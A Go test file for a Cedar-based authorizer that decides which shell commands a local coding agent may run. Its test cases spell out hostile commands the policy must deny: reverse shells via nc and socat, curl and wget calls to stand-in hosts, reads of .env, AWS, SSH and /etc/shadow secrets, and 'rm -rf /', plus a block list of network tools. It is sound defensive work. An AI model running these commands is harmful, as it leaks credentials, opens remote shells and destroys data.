package authz

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestWhyRmRfSlash(t *testing.T) {
	authz, err := NewAuthorizer("../../policy.cedar")
	if err != nil {
		t.Fatalf("err: %v", err)
	}
	ws := t.TempDir()
	allowed, reason, err := authz.EvaluateWithWorkspace("rm", "rm -rf /", "-rf /", ws)
	if err != nil {
		t.Fatalf("EvaluateWithWorkspace error: %v", err)
	}
	if allowed {
		t.Errorf("rm -rf / was ALLOWED! reason=%s", reason)
	}
}

func TestAuthorizer(t *testing.T) {
	testPolicy := `
permit (
    principal == Agent::"Local",
    action == Action::"Execute",
    resource == Command::"CLI"
) when {
    ["pytest", "npm", "mvn", "git", "ls"].contains(context.executable)
};

forbid (
    principal == Agent::"Local",
    action == Action::"Execute",
    resource == Command::"CLI"
) when {
    context.full_command like "*curl*" ||
    context.full_command like "*wget*" ||
    context.full_command like "*nc*" ||
    context.full_command like "*ssh*" ||
    context.full_command like "*~/.aws*" ||
    context.full_command like "*.env*"
};
`
	tmpDir := t.TempDir()
	policyPath := filepath.Join(tmpDir, "policy.cedar")
	if err := os.WriteFile(policyPath, []byte(testPolicy), 0644); err != nil {
		t.Fatalf("failed to write temp policy: %v", err)
	}

	testSchema := `{
  "": {
    "entityTypes": {
      "Agent": { "memberOfTypes": [] },
      "Command": { "memberOfTypes": [] }
    },
    "actions": {
      "Execute": {
        "appliesTo": {
          "principalTypes": ["Agent"],
          "resourceTypes": ["Command"],
          "context": {
            "type": "Record",
            "attributes": {
              "executable": { "type": "String", "required": true },
              "full_command": { "type": "String", "required": true }
            }
          }
        }
      }
    }
  }
}`
	schemaPath := filepath.Join(tmpDir, "schema.json")
	if err := os.WriteFile(schemaPath, []byte(testSchema), 0644); err != nil {
		t.Fatalf("failed to write temp schema: %v", err)
	}

	authz, err := NewAuthorizer(policyPath)
	if err != nil {
		t.Fatalf("NewAuthorizer failed: %v", err)
	}

	if authz.schema == nil {
		t.Errorf("expected schema to be loaded and validated")
	}

	// 1. Permitted commands
	allowedCases := []struct {
		executable  string
		fullCommand string
		args        string
	}{
		{"pytest", "pytest tests/", "tests/"},
		{"npm", "npm test", "test"},
		{"mvn", "mvn clean install", "clean install"},
		{"git", "git status", "status"},
		{"ls", "ls -la", "-la"},
	}

	for _, tc := range allowedCases {
		allowed, reason, err := authz.Evaluate(tc.executable, tc.fullCommand, tc.args)
		if err != nil {
			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
		}
		if !allowed {
			t.Errorf("expected %q to be allowed, got denied, reason: %s", tc.fullCommand, reason)
		}
	}

	// 2. Forbid overrides (full_command contains forbidden substrings)
	forbiddenCases := []struct {
		executable  string
		fullCommand string
		args        string
		name        string
	}{
		{"git", "git clone https://example.com && curl http://untrusted-test.internal", "clone https://example.com && curl http://untrusted-test.internal", "curl"},
		{"npm", "npm run build && wget http://untrusted-test.internal/pkg", "run build && wget http://untrusted-test.internal/pkg", "wget"},
		{"ls", "ls -la ~/.aws/credentials", "-la ~/.aws/credentials", "~/.aws"},
		{"ls", "ls -la .env", "-la .env", ".env"},
		{"git", "git diff && ssh user@remote", "diff && ssh user@remote", "ssh"},
		{"mvn", "mvn test && nc -e /bin/sh 10.0.0.1 4444", "test && nc -e /bin/sh 10.0.0.1 4444", "nc"},
	}

	for _, tc := range forbiddenCases {
		allowed, reason, err := authz.Evaluate(tc.executable, tc.fullCommand, tc.args)
		if err != nil {
			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
		}
		if allowed {
			t.Errorf("expected forbidden case %q (%s) to be denied, got allowed", tc.fullCommand, tc.name)
		}
		if reason == "" {
			t.Errorf("expected non-empty denial reason for %q", tc.fullCommand)
		}
	}

	// 3. Default deny (executable not in allowed list)
	deniedCases := []struct {
		executable  string
		fullCommand string
		args        string
	}{
		{"bash", "bash -c 'echo hi'", "-c 'echo hi'"},
		{"rm", "rm -rf /tmp/junk", "-rf /tmp/junk"},
		{"python", "python script.py", "script.py"},
	}

	for _, tc := range deniedCases {
		allowed, _, err := authz.Evaluate(tc.executable, tc.fullCommand, tc.args)
		if err != nil {
			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
		}
		if allowed {
			t.Errorf("expected non-whitelisted %q to be denied, got allowed", tc.fullCommand)
		}
	}
}

func TestRealPolicyCedarFile(t *testing.T) {
	// Locate repository's policy.cedar
	realPolicyPath := filepath.Join("..", "..", "policy.cedar")
	if _, err := os.Stat(realPolicyPath); err != nil {
		realPolicyPath = filepath.Join("..", "policy.cedar")
	}

	authz, err := NewAuthorizer(realPolicyPath)
	if err != nil {
		t.Fatalf("Failed to load real policy.cedar: %v", err)
	}

	// 1. Verify developer and init tools are permitted
	allowedDevTools := []struct {
		executable  string
		fullCommand string
	}{
		{"git", "git init"},
		{"git", "git status"},
		{"npm", "npm init -y"},
		{"npm", "npm install"},
		{"npx", "npx create-react-app my-app"},
		{"go", "go mod init mymodule"},
		{"go", "go build ."},
		{"go", "go test ./..."},
		{"go", "go test ./... 2>&1 | Select-Object -Last 15"},
		{"python", "python -m venv .venv"},
		{"python3", "python3 -m pytest tests/"},
		{"pip", "pip install -r requirements.txt"},
		{"cargo", "cargo init --bin"},
		{"pytest", "pytest -s tests/test_leak.py"},
		{"ls", "ls -la"},
		{"ls", "ls -al"},
		{"ls", "ls -la .env"},
		{"dir", "dir /b"},
		{"dir", "dir .env"},
		{"mkdir", "mkdir src"},
		{"echo", "echo hello"},
		{"cmd", "cmd /c dir"},
		{"powershell", "powershell -Command Get-Process"},
		{"grep", "grep -i 'test' file.txt"},
		{"sed", "sed -n 186,192p cli_tools.go"},
		{"sed", "sed 's/foo/bar/g' file.txt"},
		{"awk", "awk '{print $1}' data.txt"},
		{"cut", "cut -d, -f1 data.csv"},
		{"diff", "diff file1.go file2.go"},
		{"which", "which go"},
		{"where", "where python"},
		{"touch", "touch newfile.txt"},
		{"cd", "cd C:/Users/User/pyprj/bapltd/bap-edge/cmd && sed -n 186,192p cli_tools.go && sed -n 917,925p cli_tools.go && sed -n 14,30p config.go"},
		{"java", "java -version"},
		{"java", "java -cp \"lib/*;bin\" com.example.Main"},
	}

	for _, tc := range allowedDevTools {
		allowed, reason, err := authz.Evaluate(tc.executable, tc.fullCommand, "")
		if err != nil {
			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
		}
		if !allowed {
			t.Errorf("expected legitimate dev command %q to be allowed, got denied: %s", tc.fullCommand, reason)
		}
	}

	// 2. Verify forbid rules strictly protect credentials and egress
	forbiddenCommands := []struct {
		executable  string
		fullCommand string
		name        string
	}{
		{"git", "git status && curl https://untrusted-test.internal", "curl"},
		{"npm", "npm install && wget https://untrusted-test.internal", "wget"},
		{"python", "python script.py && nc -e /bin/sh 1.2.3.4 5555", "nc"},
		{"python", "python -c 'import os' && socat tcp-listen:4444 stdout", "socat"},
		{"go", "go test && ssh user@untrusted-test.internal", "ssh"},
		{"powershell", "powershell -Command Invoke-WebRequest https://untrusted-test.internal", "powershell Invoke-WebRequest"},
		{"powershell", "powershell -Command iwr https://untrusted-test.internal", "powershell iwr alias"},
		{"ls", "ls -la ~/.aws/credentials", "~/.aws"},
		{"cat", "cat .env", "cat .env"},
		{"type", "type .env", "type .env"},
		{"more", "more .env", "more .env"},
		{"head", "head -n 20 .env", "head .env"},
		{"tail", "tail -n 20 .env", "tail .env"},
		{"grep", "grep SECRET .env", "grep .env"},
		{"findstr", "findstr KEY .env", "findstr .env"},
		{"powershell", "powershell -Command Get-Content .env", "powershell Get-Content .env"},
		{"powershell", "powershell -Command Move-Item .env junk; Get-Content junk", "powershell Move-Item .env"},
		{"powershell", "powershell -Command Copy-Item .env junk; Get-Content junk", "powershell Copy-Item .env"},
		{"cmd", "cmd /c ren .env junk && type junk", "cmd ren .env"},
		{"cmd", "cmd /c copy .env junk && type junk", "cmd copy .env"},
		{"python", "python -c 'import shutil; shutil.copy(\".env\", \"junk\")'", "python copy .env"},
		{"ls", "ls -la .env > leak.txt", "redirection of .env metadata"},
		{"echo", "echo hello && cat .env", "chained cat .env"},
		{"git", "git status && type .env", "chained type .env"},
		{"cat", "cat ~/.ssh/id_rsa", ".ssh"},
	}

	for _, tc := range forbiddenCommands {
		allowed, _, err := authz.Evaluate(tc.executable, tc.fullCommand, "")
		if err != nil {
			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
		}
		if allowed {
			t.Errorf("SECURITY BREACH: expected %q (%s) to be forbidden, but it was ALLOWED!", tc.fullCommand, tc.name)
		}
	}

	// 3. Verify non-whitelisted tools are denied
	deniedTools := []struct {
		executable  string
		fullCommand string
	}{
		{"rm", "rm -rf /"},
		{"perl", "perl script.pl"},
		{"ruby", "ruby script.rb"},
	}

	for _, tc := range deniedTools {
		allowed, _, err := authz.Evaluate(tc.executable, tc.fullCommand, "")
		if err != nil {
			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
		}
		if allowed {
			t.Errorf("expected %q to be denied by default, but it was ALLOWED!", tc.fullCommand)
		}
	}
}

func TestWorkspaceContainment(t *testing.T) {
	realPolicyPath := filepath.Join("..", "..", "policy.cedar")
	if _, err := os.Stat(realPolicyPath); err != nil {
		realPolicyPath = filepath.Join("..", "policy.cedar")
	}

	authz, err := NewAuthorizer(realPolicyPath)
	if err != nil {
		t.Fatalf("Failed to load real policy.cedar: %v", err)
	}

	tempWorkspace, err := os.MkdirTemp("", "bap-workspace-test-*")
	if err != nil {
		t.Fatalf("Failed to create temp workspace: %v", err)
	}
	defer os.RemoveAll(tempWorkspace)

	// Create child project directories inside workspace (e.g. Maven child modules)
	childDir := filepath.Join(tempWorkspace, "child-module")
	if err := os.MkdirAll(childDir, 0755); err != nil {
		t.Fatalf("Failed to create child dir: %v", err)
	}
	siblingDir := filepath.Join(tempWorkspace, "sibling-module")
	if err := os.MkdirAll(siblingDir, 0755); err != nil {
		t.Fatalf("Failed to create sibling dir: %v", err)
	}

	// 1. Child project commands MUST be allowed (Inside Workspace)
	allowedInside := []struct {
		executable  string
		fullCommand string
		desc        string
	}{
		{"mvn", "mvn clean install", "mvn at root"},
		{"mvn", "mvn -f child-module/pom.xml compile", "mvn targeting child pom"},
		{"mvn", "cd child-module && mvn test", "cd into child module and build"},
		{"mvn", "cd child-module && cd ../sibling-module && mvn package", "cd across sibling modules inside workspace"},
		{"ls", "ls child-module/src", "ls inside child module"},
		{"cat", "cat child-module/pom.xml", "cat child module pom"},
		{"git", "git status child-module", "git status on child module"},
	}

	for _, tc := range allowedInside {
		allowed, reason, err := authz.EvaluateWithWorkspace(tc.executable, tc.fullCommand, "", tempWorkspace)
		if err != nil {
			t.Fatalf("EvaluateWithWorkspace error for %s (%s): %v", tc.fullCommand, tc.desc, err)
		}
		if !allowed {
			t.Errorf("expected child project command %q (%s) to be ALLOWED, got denied: %s", tc.fullCommand, tc.desc, reason)
		}
	}

	// 2. Read-only traversal across sibling directories is permitted (BAP AIR Enterprise model)
	allowedTraversal := []struct {
		executable  string
		fullCommand string
		desc        string
	}{
		{"ls", "cd ../.. && ls", "cd above workspace root and inspect"},
		{"cat", "cat ../../readme.md", "cat documentation file outside workspace"},
	}

	for _, tc := range allowedTraversal {
		allowed, reason, err := authz.EvaluateWithWorkspace(tc.executable, tc.fullCommand, "", tempWorkspace)
		if err != nil {
			t.Fatalf("EvaluateWithWorkspace error for %s (%s): %v", tc.fullCommand, tc.desc, err)
		}
		if !allowed {
			t.Errorf("expected read traversal %q (%s) to be ALLOWED, got denied: %s", tc.fullCommand, tc.desc, reason)
		}
	}

	// 3. Mutating operations escaping workspace root MUST be strictly denied (Outside Workspace)
	forbiddenEscapes := []struct {
		executable  string
		fullCommand string
		desc        string
	}{
		{"echo", "echo secret > ../../secret.txt", "redirection write outside workspace"},
		{"mkdir", "mkdir ../../outside_dir", "mkdir outside workspace"},
		{"rm", "rm -rf /", "root wipe escape"},
		{"cat", "cat /etc/shadow", "system credential inspection"},
	}

	for _, tc := range forbiddenEscapes {
		allowed, reason, err := authz.EvaluateWithWorkspace(tc.executable, tc.fullCommand, "", tempWorkspace)
		if err != nil {
			t.Fatalf("EvaluateWithWorkspace error for %s (%s): %v", tc.fullCommand, tc.desc, err)
		}
		if allowed {
			t.Errorf("expected mutation escape %q (%s) to be FORBIDDEN, but it was ALLOWED!", tc.fullCommand, tc.desc)
		}
		if !strings.Contains(reason, "policy") && !strings.Contains(reason, "escapes") {
			t.Errorf("expected Cedar policy denial reason for %q, got: %s", tc.fullCommand, reason)
		}
	}
}

func BenchmarkCedarEvaluate_Allowed(b *testing.B) {
	authz, err := NewAuthorizer("policy.cedar")
	if err != nil {
		b.Fatalf("failed to create authorizer: %v", err)
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		allowed, _, err := authz.Evaluate("git", "git status", "status")
		if err != nil || !allowed {
			b.Fatalf("evaluation failed: allowed=%v, err=%v", allowed, err)
		}
	}
}

func BenchmarkCedarEvaluate_Forbidden(b *testing.B) {
	authz, err := NewAuthorizer("policy.cedar")
	if err != nil {
		b.Fatalf("failed to create authorizer: %v", err)
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		allowed, _, err := authz.Evaluate("curl", "curl https://evilcorp.com/leak", "https://evilcorp.com/leak")
		if err != nil || allowed {
			b.Fatalf("evaluation failed: allowed=%v, err=%v", allowed, err)
		}
	}
}
